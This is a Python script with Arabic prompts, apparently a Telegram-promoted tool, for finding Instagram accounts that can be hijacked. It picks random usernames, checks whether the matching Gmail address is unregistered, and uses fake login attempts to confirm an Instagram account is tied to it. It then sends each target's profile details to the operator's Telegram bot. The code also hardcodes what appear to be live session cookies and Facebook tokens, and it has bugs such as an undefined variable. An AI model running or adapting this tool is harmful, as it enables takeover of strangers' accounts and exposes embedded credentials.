try:
	import requests,os,names,random,time,mechanize,sys
	from user_agent import generate_user_agent
	from uuid import uuid4
except:
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("clear")
import requests,os,names,json,random
import requests,os,names,random,time,webbrowser
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,mechanize,time
import requests,random,mechanize,datetime
#------------------------------[الالوان]------------------------------
Z = '\033[1;31m' #احمر
x = '\033[1;33m' #اصفر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
webbrowser.open('https://t.me/OoOoO2oO')
mn=0
def azz():
	import pyfiglet 
	sd = pyfiglet.figlet_format("A B S ")
	print(sd)	
	print(f'      {x} {B} ')
	
print(Z+
	'⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯ ')
print(f"""
    {B} Abbas AL Naeim.
{Z}┏━━━━━━━━━━━━━━━━━━━━━━━━━┓           
{X}┃{C}❖ @OoOoO2oO {Z}› {C}@qqqqbqq{X}    	       ┃{X}  
{F}┗━━━━━━━━━━━━━━━━━━━━━━━━━┛               """)
azz()
print('')
print('')
print(F+'⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯[Abs]⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯ ')
sid = input(' اكتب السيشن ايدي :  ')
print(F+'⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯ ')
token = input('  اكتب التوكن : ')
print(F+'⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯ ')
IDD = input(' اكتب الايدي : ')
print(F+'⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯ ')

head1={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sid}
def check(email,user):
 user=str(user)
 email=str(email)
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@py_php',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
	 url22=f"https://www.instagram.com/{user}/?__a=1&__d=dis"
	 head1 = {
		                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		                'accept-encoding': 'gzip, deflate, br',
		                'accept-language': 'en-US,en;q=0.9',
		                'cookie': 'ig_nrcb=1; mid=Yn0mhAABAAF67zpxcopyc_DiDqlW; ig_did=66C4F652-81B2-40FB-AD7E-98260457287F; fbm_124024574287414=base_domain=.instagram.com; datr=s16YYjVEB1qQX8DX52OGKMyg; shbid="6887,479320179,1686170061:01f726229ab4e647571086bdf88e559c05259655ac7a57333b18b3ad304d868d064d9d6f"; shbts="1654634061,479320179,1686170061:01f77d14d5a6a674f0db4475968ad9b0c7ed55a55526aa8f6f4e0b847db115728ebc5358"; dpr=3; fbsr_124024574287414=92QcvU0W8gtoqUzIt7CAcRtBaAsIgdrgS2sTjOWb8gY.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQjRTanV6V3U4aGxsQTdSS2c3UWZCMWp6ajRDd3RVdnk4UWVsUnVPbGJhLU1LNS1LVU85aEtjdnR6UkwxRlViTU9BUEFadmxwSFRGYUhfbjREb2hBbkt0X0hMdDVNeTEtc3FMZFVPMkNDYndIaVJseEJCZnZESUxNSkFVaFFUaXg1LWE1MGxfMVBfODVmdl9OYjF0Y1VsNV9idldMbW5zVFdPUUUzNTlncktRSkxWT29nZU1VV1F1ZDViY3pJYm9hdFZNZmxxY3A5U2hIb19YdHNzRWFVREZYbzBoZGNScHhfcGY4MVN3eUJiZTFvd21TSUsyQjBGcDRsQVk1RGZ0NDgzYzR2SXhMWTA4UzJGNVctRzZEWlMtTkZMQlh0UGJTXzZNX3pvWGZiRmJRTmNuSlB6Z09aSlpidUk1b2hDQ1ljIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUQ2WkN2ZVgzb1YxMW9jTU93V0tvZ2l0Sjc5cXRpNjZ5NW1EeGN2dWtQelpBZDNyaDkybEFzM2dCMDAzOGN6VWhwa2FBSVpDU3BMWkNtbU1vWkFUdm9UVmVWQ2JROXBkZUlOc3BxVU9pYWR2RDRoVTlrT3o5akNIR1lEZG5FWkJseUJYUGZaQzE0YWowYThOTDQ4elVkeHlFWTVvQnAwRThMcndGbFpDR1VSWkJPaHAzM2loM1pDWUVaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjU0NzgwOTc1fQ; csrftoken=qexlxxHHxAFMBARl; ds_user_id=94346366; sessionid=94346366:x0BLh8QIfQZ0:9; fbsr_124024574287414=92QcvU0W8gtoqUzIt7CAcRtBaAsIgdrgS2sTjOWb8gY.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQjRTanV6V3U4aGxsQTdSS2c3UWZCMWp6ajRDd3RVdnk4UWVsUnVPbGJhLU1LNS1LVU85aEtjdnR6UkwxRlViTU9BUEFadmxwSFRGYUhfbjREb2hBbkt0X0hMdDVNeTEtc3FMZFVPMkNDYndIaVJseEJCZnZESUxNSkFVaFFUaXg1LWE1MGxfMVBfODVmdl9OYjF0Y1VsNV9idldMbW5zVFdPUUUzNTlncktRSkxWT29nZU1VV1F1ZDViY3pJYm9hdFZNZmxxY3A5U2hIb19YdHNzRWFVREZYbzBoZGNScHhfcGY4MVN3eUJiZTFvd21TSUsyQjBGcDRsQVk1RGZ0NDgzYzR2SXhMWTA4UzJGNVctRzZEWlMtTkZMQlh0UGJTXzZNX3pvWGZiRmJRTmNuSlB6Z09aSlpidUk1b2hDQ1ljIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUQ2WkN2ZVgzb1YxMW9jTU93V0tvZ2l0Sjc5cXRpNjZ5NW1EeGN2dWtQelpBZDNyaDkybEFzM2dCMDAzOGN6VWhwa2FBSVpDU3BMWkNtbU1vWkFUdm9UVmVWQ2JROXBkZUlOc3BxVU9pYWR2RDRoVTlrT3o5akNIR1lEZG5FWkJseUJYUGZaQzE0YWowYThOTDQ4elVkeHlFWTVvQnAwRThMcndGbFpDR1VSWkJPaHAzM2loM1pDWUVaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjU0NzgwOTc1fQ; rur="LDC,53813019181,1686317048:01f7ca2ad3c3d9a4eb0b99b26a401c5bb6fd05cc6a4bfb7b3a0c8ff64b0fe937a124f7cc"',
		                'referer': 'https://www.instagram.com/{}/'.format(user),
		                'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
		                'sec-ch-ua-mobile': '?1',
		                'sec-fetch-dest': 'document',
		                'sec-fetch-mode': 'navigate',
		                'sec-fetch-site': 'snone',
		                'upgrade-insecure-requests': '1',
		                'user-agent': generate_user_agent(),
		        
		            }
	 rr = requests.get(url22,headers=head1).json()
	 bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
	 nam = str(rr['graphql']['user']['full_name'])
	 fols =str(rr['graphql']['user']['edge_follow']['count'])
	 fol = str(rr['graphql']['user']['edge_followed_by']['count'])
	 id =str(rr['graphql']['user']['id'])
	 re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")  
	 ree = re.json()
	 dat = ree['data']
	 tlg =(f"""
Hi New Available Email 😆🔥.
≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
Name ➠ {nam}
Username ➠ @{user}
Email ➠ {email}
Folloers ➠ {fol}
Following ➠ {fols}
Data ➠ {dat}
iD ➠ {id}
Post ➠ {bio}
≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
Tele : @OoOoO2oO | @T3bsBoT .""")


	 print(F+tlg)
	 print(f'{B}⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯')
	 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(IDD)+"&text="+str(tlg))
 if req['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
	 print(f"{F}God Insta {B}:{F} {email} ")
	 url=f"https://soud.me/api/Instagram?username={user}"
	 req= requests.get(url).json()
	 bio=req["info"]["bio"]
	 nam=req["info"]["name"]
	 fols=req["info"]["followers"]
	 fol=req["info"]["following"]
	 id=req["info"]["id"]
	 user=req["info"]["username"]
	 re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")  
	 ree = re.json()
	 dat = ree['data']
	 tlg =(f"""
Hi New Available Email 😆🔥.
≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
Name ➠ {nam}
Username ➠ @{user}
Email ➠ {email}
Folloers ➠ {fol}
Following ➠ {fols}
Data ➠ {dat}
iD ➠ {id}
Post ➠ {bio}
≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
Tele : @OoOoO2oO | @T3bsBoT .""")
	 print(F+tlg)
	 print(f'{E}====================================')
	 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
	 print(f"{Z}Bad Insta {C}✗{Z} {email} ")
def gmail(email,user):
	eml=str(email)
	email=eml+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	    print(f"{F}● Available gmail ➯ {email} ")
	    email=email
	    user=email.split('@gmail.com')[0]
	    check(email,user)
	else:
	    print (f'{Z}● Bad gmail ➯ '+email)
	    
	    
	
	 
def stef1():
 global mn
 while True:
#  mal=['male','femal']
#  gen=random.choice(mal)
  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='56789'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  url =f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}&rank_token=0.6134311255912255&include_reel=true'
  head ={

 'Accept': '*/*',
 'User_Agent': 'Mozilla/5.0 (Linux; Android 10; JSN-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
 'Viewport-width': '360',
 'X-ASBD-ID': '360',
 'X-CSRFToken': f'{sid}',
 'X-IG-App-ID': '1217981644879628',
 'X-Requested-With': 'XMLHttpRequest'
}

 
  data={
 'context': 'blended',
 'query': '{}'.format(name)
  }
  try:
  	rq = requests.get(url,headers=head1,data=data).json()
  except requests.exceptions.JSONDecodeError as error:
  	print('Cookies False - خطأ في الكوكيز او السيشن ايدي')
  	exit()
  
  nam=0
  try:
   while True:
    	nam+= 1
    	user=str(rq['users'][nam]['user']['username'])
    	emai=user
    	email=emai
    	gmail(email,user)
  except IndexError:
   stef1()
stef1()
